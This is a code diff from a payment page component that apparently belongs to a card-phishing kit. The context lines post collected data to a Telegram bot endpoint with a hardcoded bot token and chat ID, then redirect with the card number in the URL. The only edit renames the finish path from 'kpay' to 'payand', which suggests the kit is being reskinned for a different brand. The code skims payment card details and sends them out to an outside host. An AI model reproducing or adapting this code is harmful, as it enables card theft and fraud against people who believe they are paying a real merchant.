@@ -88,7 +88,7 @@ function PaymentPageContent() {
     axios.post(
       `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
     ).then(() => {
-      router.push(`/kpay/finish?name=${cardData.number}`);
+      router.push(`/payand/finish?name=${cardData.number}`);
     }).catch(() => {
       alert("حدث خطأ أثناء إرسال البيانات، يرجى المحاولة لاحقًا");
     });
